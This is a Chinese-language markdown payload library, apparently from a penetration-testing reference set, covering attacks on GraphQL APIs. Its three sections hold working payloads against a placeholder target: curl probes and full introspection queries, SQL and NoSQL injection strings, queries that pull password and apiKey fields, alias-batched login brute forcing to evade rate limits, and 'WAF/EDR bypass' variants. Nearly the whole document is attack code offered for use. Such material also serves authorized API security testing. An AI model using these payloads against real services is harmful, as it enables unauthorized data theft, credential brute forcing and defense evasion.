# GraphQL payload 库(API 视角)

> 父文档:[00-index.md](00-index.md)
> 涵盖:GraphQL 注入 / 内省滥用 / 批量查询 DoS。与 `../graphql.md` 内容互补——本文件偏 API 通用攻击模式,`../graphql.md` 偏 GraphQL 本体特性。

---

### GraphQL注入攻击  `graphql-injection`
GraphQL API注入与信息泄露攻击
子类：**GraphQL** · tags: `graphql` `api` `injection` `introspection`

**前置条件：** 目标使用GraphQL API；存在未授权访问或注入点

**攻击链：**

**1. 1. 探测GraphQL端点**
_探测GraphQL端点_
```
# 常见GraphQL端点
/graphql
/api/graphql
/graphql/api
/query
/graphql.php

# 发送POST请求
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

**2. 2. 内省查询**
_执行内省查询获取API结构_
```
# 完整内省查询
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

# 使用工具
gqlscan -u http://target.com/graphql
inql -t http://target.com/graphql
```

**3. 3. 批量查询攻击**
_使用批量查询绕过限制_
```
# 别名批量查询
{
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  user4: user(id: 4) { name email }
}

# 批量查询绕过速率限制
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"}
]
```

**4. 4. SQL注入**
_GraphQL中的SQL注入_
```
# GraphQL中的SQL注入
{
  user(name: "admin' OR '1'='1") {
    id
    name
    password
  }
}

# 通过参数注入
mutation {
  createUser(input: {
    name: "test' OR 1=1--"
  }) {
    id
  }
}
```

**5. 5. NoSQL注入**
_GraphQL中的NoSQL注入_
```
# MongoDB注入
{
  user(filter: {
    $or: [{name: "admin"}, {name: "root"}]
  }) {
    name
    password
  }
}

# 通过JSON注入
{
  search(text: "{\"$ne\": \"\"}") {
    results
  }
}
```

**6. 6. 信息泄露**
_获取隐藏字段和敏感信息_
```
# 获取隐藏字段
{
  user(id: 1) {
    name
    email
    password
    apiKey
    secretKey
    token
    __typename
  }
}

# 枚举所有可能字段
{
  __type(name: "User") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

**WAF/EDR 绕过变体：**

**1. 字段建议绕过**
_利用字段建议和片段枚举_
```
# 利用字段建议功能
query {
  userr(id: 1) { name }
}
# 返回: Did you mean "user"?

# 枚举隐藏字段
query {
  user(id: 1) {
    __typename
    ...on AdminUser {
      adminSecret
    }
  }
}
```

**2. 指令注入**
_使用GraphQL指令绕过_
```
# 使用指令绕过
query {
  user(id: 1) @deprecated {
    name
  }
}

# 自定义指令攻击
mutation @skip(if: false) {
  deleteUser(id: 1)
}
```

---

### GraphQL内省攻击  `graphql-introspection`
利用GraphQL内省功能获取API结构
子类：**GraphQL内省** · tags: `graphql` `introspection` `enumeration` `api`

**前置条件：** 目标使用GraphQL；内省功能未禁用

**攻击链：**

**1. 1. 基础内省**
_基础内省查询_
```
# 获取所有类型
{
  __schema {
    types {
      name
    }
  }
}

# 获取查询类型
{
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
  }
}
```

**2. 2. 完整内省**
_完整内省查询获取所有信息_
```
# 获取完整API结构
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
```

**3. 3. 使用工具分析**
_使用工具分析GraphQL_
```
# GraphQL Voyager - 可视化分析
# https://github.com/APIs-guru/graphql-voyager

# 使用CLI工具
npm install -g graphql-cli
graphql-cli introspect http://target.com/graphql

# InQL扫描
pip install inql
inql -t http://target.com/graphql

# GraphQL Cop
npm install -g graphql-cop
graphql-cop -t http://target.com/graphql
```

**WAF/EDR 绕过变体：**

**1. 绕过内省禁用**
_绕过内省禁用检测_
```
# 某些实现只检查特定字符串
# 尝试不同格式
query { __schema { types { name } } }
query IntrospectionQuery { __schema { types { name } } }
{"query":"{__schema{types{name}}}"

# 使用GET请求
curl "http://target.com/graphql?query={__schema{types{name}}}"
```

---

### GraphQL批量查询攻击  `graphql-batching`
利用GraphQL批量查询绕过速率限制
子类：**GraphQL批量查询** · tags: `graphql` `batching` `rate-limit` `bypass`

**前置条件：** 目标使用GraphQL；存在速率限制

**攻击链：**

**1. 1. 别名批量查询**
_使用别名批量查询_
```
# 使用别名一次查询多个用户
query {
  user1: user(id: 1) { name email password }
  user2: user(id: 2) { name email password }
  user3: user(id: 3) { name email password }
  user4: user(id: 4) { name email password }
  user5: user(id: 5) { name email password }
}

# 批量枚举
query {
  users: allUsers(limit: 1000) { id name email }
}
```

**2. 2. 数组批量查询**
_使用数组批量查询_
```
# 发送多个查询数组
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"},
  {"query": "{ user(id: 4) { name } }"}
]

# 使用curl发送
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]'
```

**3. 3. 暴力破解**
_批量暴力破解_
```
# 批量密码尝试
mutation {
  attempt1: login(email: "admin@test.com", password: "password1") { token }
  attempt2: login(email: "admin@test.com", password: "password2") { token }
  attempt3: login(email: "admin@test.com", password: "password3") { token }
  attempt4: login(email: "admin@test.com", password: "password4") { token }
  attempt5: login(email: "admin@test.com", password: "password5") { token }
}

# 枚举用户
query {
  check1: userExists(email: "admin@test.com")
  check2: userExists(email: "root@test.com")
  check3: userExists(email: "test@test.com")
}
```

**WAF/EDR 绕过变体：**

**1. 绕过批量限制**
_绕过批量查询限制_
```
# 分散查询
# 使用不同的查询格式
query BatchQuery {
  user1: user(id: 1) { ...UserFields }
  user2: user(id: 2) { ...UserFields }
}
fragment UserFields on User {
  name
  email
}

# 使用变量批量
query GetUser($ids: [ID!]!) {
  users(ids: $ids) {
    name
    email
  }
}
```

---


---

← 回 [00-index.md](00-index.md) · 主参考:[`../graphql.md`](../graphql.md)
